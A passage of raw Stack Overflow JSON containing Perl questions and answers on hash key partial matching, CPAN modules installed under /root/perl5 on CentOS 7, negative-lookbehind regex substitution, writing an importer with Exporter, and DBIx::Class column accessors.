%msg_to_number = ( \n    'Hello World, I am XYZ'                    =&gt; 11,\n    'I am using Stack Overflow for Guidance'   =&gt; 12,\n    'Programming is good!'                     =&gt; 13,\n   );\n\n   while(&lt;DATA&gt;)\n   {\n       chomp;\n       foreach my $k (keys %msg_to_number)\n       {\n           print \"$_, $msg_to_number{$k}\\n\" if $_ =~ /Hello World/ and $k =~ /Hello World/;\n       }\n   }\n   exit(0);\n\n   __DATA__\n   Hello World\n   Hello World, I am ABC\n   I am using Stack Overflow for Guidance\n   Programming is good\n   Hello World, I am ABC, DEF, GHI\n</code></pre>\n\n<p>Here is the output:</p>\n\n<pre><code>Hello World, 11\nHello World, I am ABC, 11\nHello World, I am ABC, DEF, GHI, 11\n</code></pre>\n"}], "owner": {"reputation": 905, "user_id": 1188611, "user_type": "registered", "accept_rate": 26, "profile_image": "https://www.gravatar.com/avatar/67b60365e971b8b9cf5f0b901868bfd7?s=128&d=identicon&r=PG", "display_name": "user1188611", "link": "https://stackoverflow.com/users/1188611/user1188611"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 99, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1447191519, "creation_date": 1447177912, "last_edit_date": 1447178821, "question_id": 33636400, "link": "https://stackoverflow.com/questions/33636400/comparison-of-string-against-key-value-pair-in-hash-map-perl", "title": "comparison of string against key-value pair in hash map perl", "body": "<p>I have key-value pairs in a hash map in Perl. Assuming all keys are unique. </p>\n\n<p>for example like this :</p>\n\n<pre><code>my %msg_to_number = ( \n 'Hello World, I am XYZ'    =&gt; 11,\n 'I am using Stack Overflow for Guidance'   =&gt; 12,\n 'Programming is good!' =&gt; 13,\n);\n</code></pre>\n\n<p>now if input strings against which I want to compare is like this:</p>\n\n<pre><code>str1 = Hello World, I am XYZ;\nstr2 = Hello World, I am XYZ and ABC;\n</code></pre>\n\n<p>so below code maps str1 to hash map key correctly but\nfor str2 it fails.</p>\n\n<p>My question is how can i modify below code to make it working for case both cases.  That is :  making code work for str1 and str2 as well. Hash map should return 11 for both str1 and str2. That is even key in hash map matches a part of string in comparison or complete string it should return match.  (I am assuming partial match case will occur with words in beginning of sentence to be compared against, this simplifies things a bit) </p>\n\n<p>right now below code makes comparison by removing characters like !, # and so on, converting to lower case and then match. </p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings;\n\nmy %msg_to_number = ( \n 'Hello World, I am XYZ'    =&gt; 11,\n 'I am using Stack Overflow for Guidance'   =&gt; 12,\n 'Programming is good!' =&gt; 13,\n);\n\nmy $str_to_match = 'Hello World, I am XYZ!!!!!';\nmy $transformed_match = $str_to_match =~ s/\\W//gr;\n\nmy ( $first_match ) = grep { s/\\W//gr =~ m/^\\Q$transformed_match\\E$/i } keys     \n%msg_to_number;\nprint \"$first_match   =  $msg_to_number{$first_match}\\n\";\n</code></pre>\n\n<p>I have tried playing with regex for above code but was not able to make it work.  if someone can suggest some changes or different method( suggestion )to do same will be great.  ( original logic which code is doing currently plus partial comparison ). This is a follow up question on stack overflow. </p>\n\n<p>Thanks</p>\n\n<p>Updated:\nExample of what should match and what should not match.</p>\n\n<p>Assume below hash map:\n    my %msg_to_number = ( \n     'Hello World, I am XYZ'    => 11,\n     'I am using Stack Overflow for Guidance'   => 12,\n     'Programming is good!' => 13,\n    );</p>\n\n<pre><code>str1 = Hello World, I am XYZ\nstr2 = Hello World\nstr3 = Hello World, I am XYZ, ABC and EFG.\n</code></pre>\n\n<p>so in above str1 and str2 should match\nwhereas str3 no match.</p>\n\n<p>As i said even if starting part is partial match then it should be match.</p>\n\n<p>let me know if this clears the use case </p>\n"}, {"tags": ["perl", "cpan", "centos7"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 3, "creation_date": 1447177561, "post_id": 33636231, "comment_id": 55046442, "body": "I&#39;m guessing this is the same problem as described in <a href=\"http://stackoverflow.com/q/32726324/176646\">I installed a module successfully with CPAN, but perl can&#39;t find it. Why?</a>"}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 1, "creation_date": 1447183142, "post_id": 33636231, "comment_id": 55049598, "body": "I can answer your second and third questions thusly: <a href=\"http://perlbrew.pl/\" rel=\"nofollow noreferrer\">perlbrew</a>."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1447238417, "post_id": 33636231, "comment_id": 55071002, "body": "If you&#39;re using the system Perl, then did you try to install the modules using <code>yum</code>?"}, {"owner": {"reputation": 131, "user_id": 4050124, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3bca412cd3cd25daffa192dc2bd4ab27?s=128&d=identicon&r=PG&f=1", "display_name": "Richard of Essex", "link": "https://stackoverflow.com/users/4050124/richard-of-essex"}, "edited": false, "score": 1, "creation_date": 1447239673, "post_id": 33636231, "comment_id": 55071670, "body": "I installed what I could using yum, but a lot of older modules needed to be installed with CPAN because of lack of availability on yum. It is the modules installed with CPAN that are installed within /root."}, {"owner": {"reputation": 131, "user_id": 4050124, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3bca412cd3cd25daffa192dc2bd4ab27?s=128&d=identicon&r=PG&f=1", "display_name": "Richard of Essex", "link": "https://stackoverflow.com/users/4050124/richard-of-essex"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1447249869, "post_id": 33636231, "comment_id": 55077140, "body": "@ThisSuitIsBlackNot - You are correct. Thank you for creating that FAQ. I have been reading that post and the local::lib docs, but I am not clear on what the best way for me to clean this up would be. From the advice in your post, I am thinking that using local::lib with a more accessible location is the best approach, so as to avoid conflicts with yum installed modules. Can I just reconfigure CPAN with a new local::lib directory and leave the current versions in place? Or is it safe to delete /root/perl5 ?"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1447446848, "post_id": 33636231, "comment_id": 55174594, "body": "@Blast If you are administering a system for multiple people, I wouldn&#39;t use local::lib. local::lib is more for creating your own personal module directory, like when you don&#39;t have admin rights; anybody who wanted to use modules from your local::lib would have to add a <code>use local::lib &#39;&#47;path&#47;to&#47;dir&#39;</code> to each of their scripts, or set some environment variables. I think it would be better to only install modules with yum, or to build a new Perl and use CPAN. See <a href=\"http://mag-sol.com/talks/yapc/2008/rpm/rpm.pdf\" rel=\"nofollow noreferrer\">Perl in RPM-Land</a> by Dave Cross as well as <i>(continued)</i>"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1447447112, "post_id": 33636231, "comment_id": 55174711, "body": "<i>(continued)</i> <a href=\"https://www.dark.ca/2010/04/08/cpan-rpms-in-rhel-centos/\" rel=\"nofollow noreferrer\">CPAN RPMs in RHEL / CentOS : generation, conflict, and solutions</a>. As for cleanup, I <i>think</i> you can safely blow away <code>&#47;root&#47;perl5</code> (don&#39;t forget to remove the local::lib-related environment variables from root&#39;s .bashrc). Notice there&#39;s nothing in your cpan configuration about your local::lib; that is all controlled by environment variables."}], "answers": [{"comments": [{"owner": {"reputation": 121105, "user_id": 2766176, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/edd8638efe875601bfe394a8aea5b16d?s=128&d=identicon&r=PG", "display_name": "brian d foy", "link": "https://stackoverflow.com/users/2766176/brian-d-foy"}, "reply_to_user": {"reputation": 14813, "user_id": 14673, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/5B0nG.png?s=128&g=1", "display_name": "Luc M", "link": "https://stackoverflow.com/users/14673/luc-m"}, "edited": false, "score": 0, "creation_date": 1476568963, "post_id": 35512245, "comment_id": 67403367, "body": "I don&#39;t you sudo for cpan. I either have a user that belongs to the group that owns the Perl directories (in a different perl), or update the system perl through the distro&#39;s package manager."}, {"owner": {"reputation": 740, "user_id": 853220, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0915ae53914a9d2251546e558844642f?s=128&d=identicon&r=PG", "display_name": "mikebabcock", "link": "https://stackoverflow.com/users/853220/mikebabcock"}, "edited": false, "score": 0, "creation_date": 1509720306, "post_id": 35512245, "comment_id": 81146555, "body": "The user wants to install packages system-wide, using sudo or not and running cpan as root or not changes nothing about how local::lib is killing his needs."}], "tags": [], "owner": {"reputation": 121105, "user_id": 2766176, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/edd8638efe875601bfe394a8aea5b16d?s=128&d=identicon&r=PG", "display_name": "brian d foy", "link": "https://stackoverflow.com/users/2766176/brian-d-foy"}, "is_accepted": false, "score": 0, "last_activity_date": 1455906159, "last_edit_date": 1495535373, "creation_date": 1455906159, "answer_id": 35512245, "question_id": 33636231, "link": "https://stackoverflow.com/questions/33636231/installed-cpan-modules-in-problematic-location/35512245#35512245", "title": "Installed CPAN Modules in Problematic Location", "body": "<p>You installed modules as root, that's what you did wrong :) Module installation involves running lots of code (including module tests) that you'll never inspect and from people you don't know and shouldn't trust.</p>\n\n<p>By default, CPAN.pm is going to look at the setup of your Perl to decide where to install the modules. It wants to put them in one of the directories in the default <code>@INC</code>.</p>\n\n<p>I'm not a CentOS user, but my advice is to install a different <code>perl</code> for users. You don't want to mess up the <code>perl</code> that your system needs to do its housekeeping work.</p>\n\n<p>You can also <a href=\"https://stackoverflow.com/a/2459704/2766176\">configure CPAN to install in a particular location</a>.</p>\n"}, {"tags": [], "owner": {"reputation": 161, "user_id": 3398848, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c89f739c3fcfed8de2a68bf11f9bf106?s=128&d=identicon&r=PG&f=1", "display_name": "CompuLingus", "link": "https://stackoverflow.com/users/3398848/compulingus"}, "is_accepted": false, "score": 8, "last_activity_date": 1460974223, "creation_date": 1460974223, "answer_id": 36691002, "question_id": 33636231, "link": "https://stackoverflow.com/questions/33636231/installed-cpan-modules-in-problematic-location/36691002#36691002", "title": "Installed CPAN Modules in Problematic Location", "body": "<p>Simplest solution (logged in as root)</p>\n\n<p>vi ~/.bashrc</p>\n\n<p>comment out the following lines:</p>\n\n<pre><code>    #export PERL_LOCAL_LIB_ROOT=\"$PERL_LOCAL_LIB_ROOT:/root/perl5\";\n    #export PERL_MB_OPT=\"--install_base /root/perl5\";\n    #export PERL_MM_OPT=\"INSTALL_BASE=/root/perl5\";\n    #export PERL5LIB=\"/root/perl5/lib/perl5:$PERL5LIB\";\n    #export PATH=\"/root/perl5/bin:$PATH\";\n</code></pre>\n\n<p>Log out, log back in as root,  and now cpan will install to the correct system directories.</p>\n\n<p>I would just delete the /root/perl5 directory and start afresh.</p>\n"}], "owner": {"reputation": 131, "user_id": 4050124, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3bca412cd3cd25daffa192dc2bd4ab27?s=128&d=identicon&r=PG&f=1", "display_name": "Richard of Essex", "link": "https://stackoverflow.com/users/4050124/richard-of-essex"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 6507, "favorite_count": 2, "protected_date": 1618517697, "answer_count": 2, "score": 12, "last_activity_date": 1618517355, "creation_date": 1447177406, "question_id": 33636231, "link": "https://stackoverflow.com/questions/33636231/installed-cpan-modules-in-problematic-location", "title": "Installed CPAN Modules in Problematic Location", "body": "<p>I am using CentOS 7 and seting up a new server.</p>\n\n<p>Whilst logged in as root, I have installed multiple perl modules through CPAN. Unfortunately, they seem to have installed inside root's home directory. I didn't notice this until all the modules were installed, but most of them have locations like this now:</p>\n\n<pre><code>/root/perl5/lib/perl5/5.16.3/x86_64-linux-thread-multi \n/root/perl5/lib/perl5/5.16.3 \n/root/perl5/lib/perl5/x86_64-linux-thread-multi \n/root/perl5/lib/perl5 /usr/local/lib64/perl5 \n</code></pre>\n\n<p>This means that, for users other than root, these modules essentially do not exist, as the permissions lock them out of that directory.</p>\n\n<p>I know I could solve this by giving all users read access to /root, but I'd rather not.</p>\n\n<p>So, I have a few specific questions to ask:</p>\n\n<ul>\n<li>What did I do wrong? Did I skip an option in CPAN the first time it\nran? (CPAN config is pasted below) </li>\n<li>What is the best way to clean this up? I presume I need to uninstall the modules, change my config, and  then reinstall them? Experienced advice is appreciated. </li>\n<li>What is the ideal general installation directory for CentOS 7? Where do I want to  move them to? I assumed CPAN would put them in an ideal default\nlocation.</li>\n</ul>\n\n<p>All advice gratefully received.</p>\n\n<pre><code>cat MyConfig.pm\n\n$CPAN::Config = {\n  'applypatch' =&gt; q[],\n  'auto_commit' =&gt; q[1],\n  'build_cache' =&gt; q[100],\n  'build_dir' =&gt; q[/root/.cpan/build],\n  'build_dir_reuse' =&gt; q[0],\n  'build_requires_install_policy' =&gt; q[yes],\n  'bzip2' =&gt; q[],\n  'cache_metadata' =&gt; q[1],\n  'check_sigs' =&gt; q[0],\n  'colorize_output' =&gt; q[0],\n  'commandnumber_in_prompt' =&gt; q[1],\n  'connect_to_internet_ok' =&gt; q[1],\n  'cpan_home' =&gt; q[/root/.cpan],\n  'ftp_passive' =&gt; q[1],\n  'ftp_proxy' =&gt; q[],\n  'getcwd' =&gt; q[cwd],\n  'gpg' =&gt; q[/bin/gpg],\n  'gzip' =&gt; q[/bin/gzip],\n  'halt_on_failure' =&gt; q[0],\n  'histfile' =&gt; q[/root/.cpan/histfile],\n  'histsize' =&gt; q[100],\n  'http_proxy' =&gt; q[],\n  'inactivity_timeout' =&gt; q[0],\n  'index_expire' =&gt; q[1],\n  'inhibit_startup_message' =&gt; q[0],\n  'keep_source_where' =&gt; q[/root/.cpan/sources],\n  'load_module_verbosity' =&gt; q[none],\n  'make' =&gt; q[/bin/make],\n  'make_arg' =&gt; q[],\n  'make_install_arg' =&gt; q[],\n  'make_install_make_command' =&gt; q[/bin/make],\n  'makepl_arg' =&gt; q[],\n  'mbuild_arg' =&gt; q[],\n  'mbuild_install_arg' =&gt; q[],\n  'mbuild_install_build_command' =&gt; q[./Build],\n  'mbuildpl_arg' =&gt; q[],\n  'no_proxy' =&gt; q[],\n  'pager' =&gt; q[/bin/less],\n  'patch' =&gt; q[/bin/patch],\n  'perl5lib_verbosity' =&gt; q[none],\n  'prefer_external_tar' =&gt; q[1],\n  'prefer_installer' =&gt; q[MB],\n  'prefs_dir' =&gt; q[/root/.cpan/prefs],\n  'prerequisites_policy' =&gt; q[follow],\n  'scan_cache' =&gt; q[atstart],\n  'shell' =&gt; q[/bin/bash],\n  'show_unparsable_versions' =&gt; q[0],\n  'show_upload_date' =&gt; q[0],\n  'show_zero_versions' =&gt; q[0],\n  'tar' =&gt; q[/bin/tar],\n  'tar_verbosity' =&gt; q[none],\n  'term_is_latin' =&gt; q[1],\n  'term_ornaments' =&gt; q[1],\n  'test_report' =&gt; q[0],\n  'trust_test_report_history' =&gt; q[0],\n  'unzip' =&gt; q[],\n  'urllist' =&gt; [q[http://mirror.sov.uk.goscomb.net/CPAN/], q[http://ww\n+w.mirrorservice.org/sites/cpan.perl.org/CPAN/], q[http://cpan.mirrors\n+.ovh.net/ftp.cpan.org/]],\n  'use_sqlite' =&gt; q[0],\n  'version_timeout' =&gt; q[15],\n  'wget' =&gt; q[/bin/wget],\n  'yaml_load_code' =&gt; q[0],\n  'yaml_module' =&gt; q[YAML],\n};\n1;\n__END__\n</code></pre>\n"}, {"tags": ["regex", "perl", "substitution", "negation"], "answers": [{"comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "reply_to_user": {"reputation": 425, "user_id": 5547553, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/99f225ea4837d3be18c806f798328b7c?s=128&d=identicon&r=PG&f=1", "display_name": "lmocsi", "link": "https://stackoverflow.com/users/5547553/lmocsi"}, "edited": false, "score": 0, "creation_date": 1447282565, "post_id": 33635932, "comment_id": 55096460, "body": "Yes. It matches any whitespace. Easy enough to be more selective though."}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 1, "last_activity_date": 1447176290, "creation_date": 1447176290, "answer_id": 33635932, "question_id": 33635725, "link": "https://stackoverflow.com/questions/33635725/negative-regex-for-perl-string-substitution/33635932#33635932", "title": "negative regex for perl string substitution", "body": "<p>Exclamation mark is not negation in regex. At least, not like that.</p>\n\n<p>What you need is negative lookbehind:</p>\n\n<pre><code>s/(?&lt;!^)\\s+/ /g;\n</code></pre>\n\n<p>Should do the trick. </p>\n"}, {"comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 1, "creation_date": 1447176638, "post_id": 33635955, "comment_id": 55045904, "body": "Non space, keep it, followed by one or more spaces, replace with space. (and the bit you kept). I think? But a nice solution."}, {"owner": {"reputation": 11918, "user_id": 5527985, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CfG3C.png?s=128&g=1", "display_name": "bobble bubble", "link": "https://stackoverflow.com/users/5527985/bobble-bubble"}, "edited": false, "score": 0, "creation_date": 1447176893, "post_id": 33635955, "comment_id": 55046053, "body": "nice idea, yes or <code>(?&lt;=\\S) +</code>"}, {"owner": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "edited": false, "score": 0, "creation_date": 1447177253, "post_id": 33635955, "comment_id": 55046261, "body": "Yes, \\K is positive look behind from v5.10 and newer."}], "tags": [], "owner": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "is_accepted": true, "score": 2, "last_activity_date": 1447176359, "creation_date": 1447176359, "answer_id": 33635955, "question_id": 33635725, "link": "https://stackoverflow.com/questions/33635725/negative-regex-for-perl-string-substitution/33635955#33635955", "title": "negative regex for perl string substitution", "body": "<p>You can change approach to the regex</p>\n\n<pre><code>s/\\S\\K +/ /g;\n</code></pre>\n"}], "owner": {"reputation": 425, "user_id": 5547553, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/99f225ea4837d3be18c806f798328b7c?s=128&d=identicon&r=PG&f=1", "display_name": "lmocsi", "link": "https://stackoverflow.com/users/5547553/lmocsi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 382, "favorite_count": 0, "accepted_answer_id": 33635955, "answer_count": 2, "score": 1, "last_activity_date": 1447176359, "creation_date": 1447175605, "question_id": 33635725, "link": "https://stackoverflow.com/questions/33635725/negative-regex-for-perl-string-substitution", "title": "negative regex for perl string substitution", "body": "<p>I'm trying to shorten all multiple spaces to one space, except for the first occurence of spaces (indentation).</p>\n\n<p>I've found that this code will replace the first occurences:</p>\n\n<p><code>$_ =~ s/^ +/ /;</code></p>\n\n<p>So I thought, its negation will do what I want. But it does not:</p>\n\n<p><code>$_ =~ s/!^ +/ /g;</code></p>\n\n<p>What am I doing wrong?</p>\n"}, {"tags": ["perl", "import"], "comments": [{"owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "edited": false, "score": 0, "creation_date": 1447173718, "post_id": 33634898, "comment_id": 55043913, "body": "Note that this will work if you use parens: <code>info(&quot;a&quot;, &quot;b&quot;);</code>, but like @ikegami said, most people use Exporter."}], "answers": [{"comments": [{"owner": {"reputation": 16645, "user_id": 402322, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/GWEWt.gif?s=128&g=1", "display_name": "ceving", "link": "https://stackoverflow.com/users/402322/ceving"}, "edited": false, "score": 0, "creation_date": 1447173948, "post_id": 33635058, "comment_id": 55044072, "body": "Ok the second does it. Thanks!"}, {"owner": {"reputation": 16645, "user_id": 402322, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/GWEWt.gif?s=128&g=1", "display_name": "ceving", "link": "https://stackoverflow.com/users/402322/ceving"}, "edited": false, "score": 0, "creation_date": 1447174382, "post_id": 33635058, "comment_id": 55044388, "body": "The Exporter does not make any difference. The <code>$INC{&quot;MSG.pm&quot;} = 1;</code> which makes it possible to say <code>use MSG</code> makes the difference. The first solution is simply wrong."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 2, "last_activity_date": 1447179224, "last_edit_date": 1447179224, "creation_date": 1447173618, "answer_id": 33635058, "question_id": 33634898, "link": "https://stackoverflow.com/questions/33634898/how-to-write-an-importer-for-subs-in-perl/33635058#33635058", "title": "How to write an importer for subs in Perl?", "body": "<p>Most people use <a href=\"http://search.cpan.org/perldoc?Exporter\" rel=\"nofollow\">Exporter</a>.</p>\n\n<pre><code>BEGIN {\n  package MSG;\n\n  use strict;\n  use warnings;\n\n  use Exporter qw( import );\n  our @EXPORT = qw( info );\n\n  sub info {\n    print STDERR join(\"\\n\", @_), \"\\n\";\n  }\n}\n\n{\n  use strict;\n  use warnings;\n\n  BEGIN { MSG-&gt;import; }\n\n  info \"a\", \"b\";\n}\n</code></pre>\n\n<p>The <code>BEGIN</code> around <code>import</code> ensures the symbol is imported before <code>info</code> is compiled. It would be cleaner to use <code>use</code>, which is possible using small change.</p>\n\n<pre><code>BEGIN {\n  package MSG;\n\n  use strict;\n  use warnings;\n\n  use Exporter qw( import );\n  our @EXPORT = qw( info );\n\n  sub info {\n    print STDERR join(\"\\n\", @_), \"\\n\";\n  }\n\n  $INC{\"MSG.pm\"} = 1;\n}\n\n{\n  use strict;\n  use warnings;\n\n  use MSG;\n\n  info \"a\", \"b\";\n}\n</code></pre>\n"}], "owner": {"reputation": 16645, "user_id": 402322, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/GWEWt.gif?s=128&g=1", "display_name": "ceving", "link": "https://stackoverflow.com/users/402322/ceving"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 185, "favorite_count": 0, "accepted_answer_id": 33635058, "answer_count": 1, "score": 0, "last_activity_date": 1447179224, "creation_date": 1447173111, "last_edit_date": 1495539870, "question_id": 33634898, "link": "https://stackoverflow.com/questions/33634898/how-to-write-an-importer-for-subs-in-perl", "title": "How to write an importer for subs in Perl?", "body": "<p>I have the following code:</p>\n\n<pre><code>#! /usr/bin/perl -T\n\n{\n  package MSG;\n  use strict;\n  use warnings;\n\n  sub info\n  {\n    print STDERR join(\"\\n\", @_), \"\\n\";\n  }\n\n  sub import\n  {\n    no strict 'refs';\n    *{caller().'::info'} = \\&amp;info;\n  }\n}\n\n{\n  package main;\n  use strict;\n  use warnings;\n  MSG-&gt;import;\n#  sub info;\n\n  info \"a\", \"b\";\n}\n</code></pre>\n\n<p>Without the <code>sub info;</code> line in the <code>main</code> package, I get the following error:</p>\n\n<pre>\nString found where operator expected \n</pre>\n\n<p>I think the reason is explained <a href=\"https://stackoverflow.com/a/5994023/402322\">here</a>. When I add the line, the code works as expected. But I do not want it in the <code>main</code> package.</p>\n\n<p>How to move whatever <code>sub info;</code> does into the <code>import</code> function of the <code>MSG</code> package?</p>\n"}, {"tags": ["perl", "dbix-class"], "answers": [{"comments": [{"owner": {"reputation": 587, "user_id": 2245633, "user_type": "registered", "accept_rate": 18, "profile_image": "https://i.stack.imgur.com/SLpQK.gif?s=128&g=1", "display_name": "CodeGorilla", "link": "https://stackoverflow.com/users/2245633/codegorilla"}, "edited": false, "score": 0, "creation_date": 1447407041, "post_id": 33635706, "comment_id": 55151059, "body": "is there something wrong with the approach I was using?  The documentation seems to imply it&#39;s the right path..."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 587, "user_id": 2245633, "user_type": "registered", "accept_rate": 18, "profile_image": "https://i.stack.imgur.com/SLpQK.gif?s=128&g=1", "display_name": "CodeGorilla", "link": "https://stackoverflow.com/users/2245633/codegorilla"}, "edited": false, "score": 0, "creation_date": 1447407218, "post_id": 33635706, "comment_id": 55151140, "body": "I can&#39;t see anything in the documentation which implies that your <code>add_columns(&quot;+date&quot; ...)</code> syntax will work."}, {"owner": {"reputation": 587, "user_id": 2245633, "user_type": "registered", "accept_rate": 18, "profile_image": "https://i.stack.imgur.com/SLpQK.gif?s=128&g=1", "display_name": "CodeGorilla", "link": "https://stackoverflow.com/users/2245633/codegorilla"}, "edited": false, "score": 0, "creation_date": 1447410332, "post_id": 33635706, "comment_id": 55152938, "body": "<a href=\"https://metacpan.org/pod/DBIx::Class::Manual::Cookbook#Wrapping-overloading-a-column-accessor\" rel=\"nofollow noreferrer\">metacpan.org/pod/&hellip;</a> describes using the accessor overload and the third paragraph of <a href=\"https://metacpan.org/pod/DBIx::Class::ResultSource#add_columns\" rel=\"nofollow noreferrer\">metacpan.org/pod/DBIx::Class::ResultSource#add_columns</a> refers to <code>(&#39;+col1&#39;)</code> - I added the two together, and assumed I could append that syntax to a ResultSource package"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 587, "user_id": 2245633, "user_type": "registered", "accept_rate": 18, "profile_image": "https://i.stack.imgur.com/SLpQK.gif?s=128&g=1", "display_name": "CodeGorilla", "link": "https://stackoverflow.com/users/2245633/codegorilla"}, "edited": false, "score": 0, "creation_date": 1447410565, "post_id": 33635706, "comment_id": 55153074, "body": "You&#39;re right. Let me have a look and see if I can work out what the problem is."}, {"owner": {"reputation": 587, "user_id": 2245633, "user_type": "registered", "accept_rate": 18, "profile_image": "https://i.stack.imgur.com/SLpQK.gif?s=128&g=1", "display_name": "CodeGorilla", "link": "https://stackoverflow.com/users/2245633/codegorilla"}, "edited": false, "score": 0, "creation_date": 1455785268, "post_id": 33635706, "comment_id": 58647455, "body": "Upgraded <code>DBIx::Class::Schema::Loader</code> to 0.07044 (or later) to get the <code>col_accessor_map</code> functionality. Then adding <code>-o col_accessor_map=&quot;{ table_name =&gt; { date =&gt; &#39;_date&#39; } }&quot;</code> to the command line (and note the quotes around the <code>_date</code> - essential!)"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 587, "user_id": 2245633, "user_type": "registered", "accept_rate": 18, "profile_image": "https://i.stack.imgur.com/SLpQK.gif?s=128&g=1", "display_name": "CodeGorilla", "link": "https://stackoverflow.com/users/2245633/codegorilla"}, "edited": false, "score": 0, "creation_date": 1455785441, "post_id": 33635706, "comment_id": 58647553, "body": "Yeah. Here&#39;s the commit that fixed the problem - <a href=\"https://github.com/dbsrgits/dbix-class-schema-loader/commit/3a7a1d7726d84d0970d8ff8e8107fc52e3af0f53\" rel=\"nofollow noreferrer\">github.com/dbsrgits/dbix-class-schema-loader/commit/&hellip;</a>"}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": 